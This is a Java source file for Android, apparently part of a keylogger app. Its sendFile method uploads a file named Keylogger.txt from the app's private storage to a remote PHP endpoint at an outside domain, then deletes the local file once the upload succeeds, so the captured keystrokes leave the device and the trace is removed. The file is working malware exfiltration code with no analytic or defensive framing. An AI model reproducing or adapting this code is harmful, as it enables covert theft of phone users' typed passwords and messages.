package com.example.project;

import android.content.Context;
import android.util.Log;

import java.io.File;
import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttp;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class okHTTP3 {
    OkHttpClient client = new OkHttpClient();

    public void sendFile(Context context){
        String filepath = context.getFilesDir().getPath() + "/Keylogger.txt";
        String url = "https://eloquent-snyder.cloud/receivefile.php";
        File file = new File(filepath);
        RequestBody fileBody = RequestBody.create(MediaType.parse("application/octet-stream"), file);

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", file.getName(), fileBody)
                .build();

        Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    // Handle the failure
                    throw new IOException("Unexpected code " + response);
                }
                // Delete the file if the response was successful
                Log.i("send","sent");
                file.delete();
            }
        });
    }
}
